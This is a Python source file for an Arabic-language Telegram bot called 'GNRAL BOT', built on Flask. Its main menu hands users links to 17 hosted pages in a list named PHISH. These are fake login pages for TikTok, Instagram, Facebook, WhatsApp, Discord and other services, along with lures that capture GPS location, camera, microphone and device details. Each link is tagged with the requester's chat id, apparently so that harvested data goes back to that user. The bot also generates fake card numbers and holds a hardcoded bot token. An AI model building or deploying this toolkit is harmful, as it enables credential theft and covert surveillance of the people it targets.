import os, sys, subprocess, time, threading, random, string, logging, io
import requests

# ========== مكتبة تثبيت مضمونة ==========
def safe_install(package, import_name=None):
    name = import_name or package
    try:
        __import__(name)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])

safe_install("flask", "flask")
safe_install("requests", "requests")
safe_install("pyTelegramBotAPI", "telebot")
safe_install("gTTS", "gtts")
safe_install("qrcode[pil]", "qrcode")
safe_install("Pillow", "PIL")          # هنا الصواب: تثبيت Pillow واستيراد PIL
safe_install("pyshorteners", "pyshorteners")
safe_install("deep-translator", "deep_translator")

from flask import Flask, request
from telebot import TeleBot, types
from io import BytesIO

TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
BASE_URL = "https://fgnral-html-5waj.onrender.com"   # رابط الصفحات
APP_URL = "https://gamee-h4uf.onrender.com"           # رابط تطبيقك على Render

bot = TeleBot(TOKEN, threaded=False)
app = Flask(__name__)
user_states = {}
bot_rating = 0

# ========== الصفحات (17) ==========
PHISH = [
    ("🎵 تيك توك", "tiktok.html"),       ("📷 انستقرام", "instagram.html"),
    ("👻 سناب شات", "snapchat.html"),     ("📘 فيسبوك", "facebook.html"),
    ("💬 واتساب", "whatsapp.html"),       ("✈️ تيليجرام", "telegram.html"),
    ("🐦 تويتر", "twitter.html"),         ("▶️ يوتيوب", "youtube.html"),
    ("🎮 ديسكورد", "discord.html"),       ("🤖 ريدت", "reddit.html"),
    ("🎮 ببجي UC", "pubg_cuc.html"),      ("🏆 مسابقة الحلم", "dream.html"),
    ("📍 سحب الموقع", "gps.html"),        ("📸 فحص الكاميرا", "camera.html"),
    ("🎙️ فحص الميكروفون", "mic.html"),    ("🎥 فحص الفيديو", "video.html"),
    ("📱 فحص مواصفات الجهاز", "device.html")
]

# ========== دوال الخدمات ==========
def gen_pass(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*()", k=length))

def fake_visa():
    prefix = random.choice(["4","5","37","34"])
    length = 16 if prefix in ["4","5"] else 15
    while len(prefix) < length: prefix += str(random.randint(0,9))
    exp = f"{random.randint(1,12):02d}/{random.randint(2025,2030)}"
    cvv = random.randint(100,999)
    return f"💳 {prefix}\n📅 {exp}\n🔒 {cvv}"

def shorten_url(url):
    try:
        from pyshorteners import Shortener
        return Shortener().tinyurl.short(url)
    except: pass
    try:
        r = requests.get(f"https://tinyurl.com/api-create.php?url={requests.utils.quote(url)}", timeout=5)
        if r.status_code == 200: return r.text.strip()
    except: pass
    return url

def text_to_voice(text, lang='ar'):
    from gtts import gTTS
    buf = BytesIO()
    gTTS(text, lang=lang).write_to_fp(buf)
    buf.seek(0)
    return buf

def translate_txt(text, target='ar'):
    try:
        from deep_translator import GoogleTranslator
        return GoogleTranslator(source='auto', target=target).translate(text)
    except: return "تعذرت الترجمة"

def decorate(text):
    return ''.join({'ا':'أ','ب':'بـ','ت':'تـ','ث':'ثـ','ج':'جـ','ح':'حـ','خ':'خـ','د':'د','ذ':'ذ','ر':'ر','ز':'ز','س':'سـ','ش':'شـ','ص':'صـ','ض':'ضـ','ط':'طـ','ظ':'ظـ','ع':'عـ','غ':'غـ','ف':'فـ','ق':'قـ','ك':'كـ','ل':'لـ','م':'مـ','ن':'نـ','ه':'هـ','و':'و','ي':'يـ'}.get(c,c) for c in text)

def temp_email():
    try:
        s = requests.Session(); s.headers.update({'User-Agent':'Mozilla/5.0'})
        domain = s.get('https://api.mail.tm/domains').json()['hydra:member'][0]['domain']
        addr = ''.join(random.choices(string.ascii_lowercase, k=10)) + "@" + domain
        pwd = gen_pass(12)
        s.post('https://api.mail.tm/accounts', json={'address':addr,'password':pwd})
        return f"📧 {addr}\n🔑 {pwd}"
    except: return "فشل إنشاء البريد"

def make_qr(data):
    import qrcode
    qr = qrcode.QRCode(version=1, box_size=10, border=4)
    qr.add_data(data); qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    buf = BytesIO(); img.save(buf, 'PNG'); buf.seek(0)
    return buf

def read_qr(file_bytes):
    try:
        from PIL import Image; from pyzbar.pyzbar import decode
        decoded = decode(Image.open(BytesIO(file_bytes)))
        if decoded: return decoded[0].data.decode('utf-8')
    except: return None

# ========== Webhook ==========
@app.route(f"/{TOKEN}", methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        try:
            update = types.Update.de_json(request.get_data().decode('utf-8'))
            bot.process_new_updates([update])
            return ''
        except: return ''
    return '!', 403

@app.route("/health")
def health(): return "OK", 200

# ========== القائمة الرئيسية ==========
@bot.message_handler(commands=['start'])
def start(msg):
    markup = types.InlineKeyboardMarkup(row_width=2)
    for i in range(0, len(PHISH)-1, 2):
        l, r = PHISH[i], PHISH[i+1]
        markup.row(types.InlineKeyboardButton(l[0], callback_data=f"ph|{l[1]}"),
                   types.InlineKeyboardButton(r[0], callback_data=f"ph|{r[1]}"))
    last = PHISH[-1]
    markup.row(types.InlineKeyboardButton(last[0], callback_data=f"ph|{last[1]}"))
    markup.row(types.InlineKeyboardButton("🔊 نص لصوت", callback_data="tts"),
               types.InlineKeyboardButton("✨ زخرفة", callback_data="decor"))
    markup.row(types.InlineKeyboardButton("🔗 اختصار", callback_data="shorten"),
               types.InlineKeyboardButton("🔐 كلمة سر", callback_data="genpass"))
    markup.row(types.InlineKeyboardButton("🌐 ترجمة", callback_data="translate"),
               types.InlineKeyboardButton("📧 بريد وهمي", callback_data="tempmail"))
    markup.row(types.InlineKeyboardButton("📸 باركود", callback_data="createqr"),
               types.InlineKeyboardButton("📷 قراءة باركود", callback_data="readqr"))
    markup.row(types.InlineKeyboardButton("💳 فيزا", callback_data="visa"),
               types.InlineKeyboardButton("🆔 معرفي", callback_data="myid"))
    markup.row(types.InlineKeyboardButton("📜 نصائح", callback_data="tips"),
               types.InlineKeyboardButton("💻 كيف تصبح هاكر", callback_data="hack"))
    markup.row(types.InlineKeyboardButton("📄 شروط", callback_data="terms"),
               types.InlineKeyboardButton("📖 شرح", callback_data="help"))
    markup.row(types.InlineKeyboardButton("⭐ تقييم", callback_data="rate"),
               types.InlineKeyboardButton("🔄 رجوع", callback_data="back"))
    bot.send_message(msg.chat.id, "🔱 <b>GNRAL BOT</b>\n\nاختر الخدمة:", parse_mode="HTML", reply_markup=markup)

# ========== أزرار ==========
@bot.callback_query_handler(func=lambda c: True)
def callback(call):
    chat, data, msg_id = call.message.chat.id, call.data, call.message.message_id
    if data == "back": start(call.message); bot.answer_callback_query(call.id); return
    if data.startswith("ph|"):
        page = data.split("|")[1]
        link = f"{BASE_URL}/{page}?chat={chat}"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        bot.edit_message_text(f"🔗 رابط الصفحة:\n<code>{link}</code>", chat, msg_id, parse_mode="HTML", reply_markup=markup)
    elif data == "tts": user_states[chat] = "tts"; bot.send_message(chat, "أرسل النص:")
    elif data == "decor": user_states[chat] = "decor"; bot.send_message(chat, "أرسل النص:")
    elif data == "shorten": user_states[chat] = "shorten"; bot.send_message(chat, "أرسل الرابط:")
    elif data == "genpass": bot.send_message(chat, f"<code>{gen_pass()}</code>", parse_mode="HTML")
    elif data == "translate": user_states[chat] = "translate"; bot.send_message(chat, "أرسل النص:")
    elif data == "tempmail": bot.send_message(chat, temp_email())
    elif data == "createqr": user_states[chat] = "createqr"; bot.send_message(chat, "أرسل النص:")
    elif data == "readqr": user_states[chat] = "readqr"; bot.send_message(chat, "أرسل صورة الباركود:")
    elif data == "visa": bot.send_message(chat, fake_visa())
    elif data == "myid": bot.send_message(chat, f"🆔 {call.from_user.id}")
    elif data == "tips": bot.send_message(chat, "📜 نصائح...")
    elif data == "hack": bot.send_message(chat, "💻 كيف تصبح هاكر...")
    elif data == "terms": bot.send_message(chat, "📄 شروط الاستخدام")
    elif data == "help": bot.send_message(chat, "📖 شرح البوت")
    elif data == "rate":
        global bot_rating; bot_rating += 1
        bot.send_message(chat, f"⭐ التقييمات: {bot_rating}")
    bot.answer_callback_query(call.id)

# ========== معالج النصوص ==========
@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "tts")
def handle_tts(m):
    user_states.pop(m.chat.id)
    try: bot.send_voice(m.chat.id, text_to_voice(m.text))
    except: bot.send_message(m.chat.id, "فشل التحويل")

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "decor")
def handle_decor(m):
    user_states.pop(m.chat.id); bot.send_message(m.chat.id, decorate(m.text))

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "shorten")
def handle_shorten(m):
    user_states.pop(m.chat.id); bot.send_message(m.chat.id, shorten_url(m.text))

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "translate")
def handle_translate(m):
    user_states.pop(m.chat.id); bot.send_message(m.chat.id, translate_txt(m.text))

@bot.message_handler(content_types=['photo'])
def handle_photo(m):
    if user_states.get(m.chat.id) == "readqr":
        user_states.pop(m.chat.id)
        file = bot.download_file(bot.get_file(m.photo[-1].file_id).file_path)
        res = read_qr(file)
        bot.send_message(m.chat.id, res if res else "لم أجد باركود")

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "createqr")
def handle_createqr(m):
    user_states.pop(m.chat.id)
    try: bot.send_photo(m.chat.id, make_qr(m.text))
    except: bot.send_message(m.chat.id, "فشل إنشاء الباركود")

# ========== Keep-Alive ==========
def keep_alive():
    while True:
        time.sleep(120)
        try: requests.get(f"{APP_URL}/health", timeout=5)
        except: pass

threading.Thread(target=keep_alive, daemon=True).start()

if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url=f"{APP_URL}/{TOKEN}")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))